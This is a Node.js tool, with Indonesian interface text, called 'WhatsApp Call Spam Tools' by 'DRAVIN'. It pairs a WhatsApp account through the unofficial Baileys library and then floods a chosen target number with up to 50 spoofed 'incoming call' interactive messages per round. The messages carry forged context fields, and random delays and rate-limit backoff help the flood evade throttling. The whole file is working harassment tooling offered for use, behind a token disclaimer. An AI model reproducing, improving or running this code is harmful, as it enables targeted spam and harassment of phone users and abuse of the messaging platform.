const { default: makeWASocket, useMultiFileAuthState, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default;
const readline = require("readline");
const pino = require("pino");

// Utility functions
const sleep = (ms, variation = 0) => new Promise(resolve => {
    setTimeout(resolve, ms + (variation ? Math.floor(Math.random() * variation) : 0));
});

const EXIT_WORDS = ["exit", "keluar", "quit", "q"];

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        const val = ans.trim().toLowerCase();
        if (EXIT_WORDS.includes(val)) {
            console.log(chalk.red("\n[!] Keluar dari tools..."));
            rl.close();
            process.exit(0);
        }
        rl.close();
        resolve(ans);
    }));
};

const progressBar = async (text = "Menyiapkan koneksi", total = 15, delay = 150) => {
    for (let i = 0; i <= total; i++) {
        const filled = chalk.green("█".repeat(i));
        const empty = chalk.gray("░".repeat(total - i));
        const bar = filled + empty;
        process.stdout.write(`\r${chalk.yellow(`[⌛] ${text}:`)} ${bar}`);
        await sleep(delay);
    }
    process.stdout.write(chalk.green(" ✓\n"));
};

const animasiGaris = async (total = 54, delay = 50) => {
    const mid = Math.floor(total / 2);

    for (let i = 0; i <= mid; i++) {
        const kiri = chalk.green("═".repeat(i));
        const kanan = chalk.green("═".repeat(i));
        const tengah = chalk.gray(" ".repeat(total - i * 2));

        const baris = kiri + tengah + kanan;
        process.stdout.write(`\r${baris}`);
        await sleep(delay);
    }

    process.stdout.write("\n");
};

const typeEffect = async (text, delay = 20) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const textingteks = async (text, delay = 10) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    await textingteks(chalk.magenta("[⚙️] WhatsApp Call Spam Tools - BY DRAVIN"));
    await animasiGaris();
    await typeEffect(chalk.green("• Gunakan dengan bijak, resiko ditanggung pengguna"));
    await typeEffect(chalk.yellow("• Pastikan nomor sender call aktif dan valid"));
    await typeEffect(chalk.yellow("💡 Tips ketik exit/quit/keluar/q untuk keluar dari tools"));
    await animasiGaris();
};

// WhatsApp Connection
async function initConnection() {
    const { state, saveCreds } = await useMultiFileAuthState('./dravin_call_session');
    const conn = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    conn.ev.on('creds.update', saveCreds);
    return conn;
}

async function requestPairingCode(conn, senderNumber) {
    try {
        console.log(chalk.yellow("\n📱 Meminta kode pairing dari WhatsApp..."));
        
        // Remove any non-numeric characters
        const cleanNumber = senderNumber.replace(/[^0-9]/g, '');
        
        // Request pairing code from WhatsApp
        const { timeout } = await conn.requestPairingCode(cleanNumber);
        
        console.log(chalk.green(`\n✅ Kode pairing telah dikirim ke nomor ${senderNumber}`));
        console.log(chalk.yellow(`⏳ Kode akan kadaluarsa dalam ${timeout} detik`));
        console.log(chalk.cyan("📲 Buka WhatsApp di perangkat tersebut dan ikuti instruksi untuk pairing"));
        
        return true;
    } catch (error) {
        console.log(chalk.red(`\n❌ Gagal meminta kode pairing: ${error.message}`));
        return false;
    }
}

async function verifyPairing(conn) {
    try {
        await progressBar("Menunggu verifikasi pairing", 20, 150);
        
        // Wait for connection to be open
        const waitForOpen = new Promise((resolve) => {
            conn.ev.on('connection.update', (update) => {
                if (update.connection === 'open') {
                    resolve(true);
                }
            });
        });
        
        // Timeout after 2 minutes
        const timeout = new Promise((resolve) => {
            setTimeout(() => resolve(false), 120000);
        });
        
        return Promise.race([waitForOpen, timeout]);
    } catch (error) {
        console.log(chalk.red(`\n❌ Gagal verifikasi pairing: ${error.message}`));
        return false;
    }
}

// Fake Call Function
async function sendFakeCall(conn, targetNumber) {
    try {
        const message = await generateWAMessageFromContent(targetNumber, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [targetNumber]
                        },
                        body: {
                            text: "Incoming call..."
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    call_type: "voice",
                                    call_id: Math.random().toString(36).substring(7)
                                })
                            }]
                        }
                    }
                }
            }
        }, {});

        await conn.relayMessage(targetNumber, message.message, {
            messageId: message.key.id
        });
        return true;
    } catch (error) {
        console.error(chalk.red(`Error sending fake call: ${error.message}`));
        return false;
    }
}

// Main Function
async function startCallSpam() {
    try {
        await showBanner();
        const conn = await initConnection();
        
        // Step 1: Get sender number
        let senderNumber = await question(
            chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' ├──╼') + chalk.yellow('Nomor Sender Call (62xxxxxx)') + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
        );
        
        if (!/^62\d{9,13}$/.test(senderNumber)) {
            console.log(chalk.red("\n❌ Format nomor tidak valid. Contoh: 6281234567890"));
            process.exit(1);
        }
        
        // Step 2: Request pairing code
        const pairingRequested = await requestPairingCode(conn, senderNumber);
        if (!pairingRequested) {
            process.exit(1);
        }
        
        // Step 3: Verify pairing
        const verified = await verifyPairing(conn);
        if (!verified) {
            console.log(chalk.red("\n❌ Gagal verifikasi pairing. Coba lagi nanti."));
            process.exit(1);
        }
        
        console.log(chalk.green("\n✅ Pairing berhasil! Siap untuk spam call."));
        
        // Main spam call loop
        while (true) {
            let targetNumber = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow('Nomor Target Call (62xxxxxx)') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );
            
            if (!/^62\d{9,13}$/.test(targetNumber)) {
                console.log(chalk.red("\n❌ Format nomor tidak valid. Contoh: 6281234567890"));
                continue;
            }
            
            const jumlah = parseInt(await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow("Jumlah Spam Call (1-50)") + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            ));
            
            if (isNaN(jumlah) || jumlah < 1 || jumlah > 50) {
                console.log(chalk.red("\n❌ Jumlah harus antara 1 dan 50"));
                continue;
            }
            
            console.log(chalk.green(`\n🚀 Memulai spam call ke ${targetNumber} sebanyak ${jumlah}x...`));
            
            let sukses = 0;
            for (let i = 0; i < jumlah; i++) {
                try {
                    await progressBar(`Mengirim panggilan ${i + 1}/${jumlah}`, 10, 100);
                    
                    const callSent = await sendFakeCall(conn, targetNumber);
                    if (callSent) {
                        console.log(chalk.green(`[✓] ${i + 1}/${jumlah} => Call ke ${targetNumber} berhasil`));
                        sukses++;
                    } else {
                        console.log(chalk.red(`[X] ${i + 1}/${jumlah} => Gagal mengirim call`));
                    }
                    
                    // Random delay between calls
                    const delay = Math.floor(Math.random() * 3000) + 1000;
                    await sleep(delay);
                } catch (error) {
                    console.log(chalk.red(`[X] ${i + 1}/${jumlah} => Gagal: ${error.message}`));
                    if (error.message.includes("rate limit")) {
                        console.log(chalk.yellow("⚠️ Terlalu banyak panggilan, menunggu 30 detik..."));
                        await sleep(30000);
                    }
                }
            }
            
            console.log(chalk.cyan("\n📊 Ringkasan Spam Call"));
            console.log(chalk.cyan(`├─ Target : ${chalk.white(targetNumber)}`));
            console.log(chalk.cyan(`├─ Total : ${chalk.white(jumlah)}`));
            console.log(chalk.cyan(`├─ Sukses : ${chalk.green(sukses)}`));
            console.log(chalk.cyan(`└─ Gagal : ${chalk.red(jumlah - sukses)}`));
            
            const ulang = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.magenta("🔁 Ingin spam call lagi? (y/n)") + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );
            
            if (ulang.toLowerCase() !== "y") break;
        }
        
        console.log(chalk.green("\n✨ Terima kasih telah menggunakan Dravin Call Spam Tools!"));
        process.exit(0);
    } catch (error) {
        console.error(chalk.red(`\n❌ Error: ${error.message}`));
        process.exit(1);
    }
}

// Start the application
(async () => {
    await startCallSpam();
})();
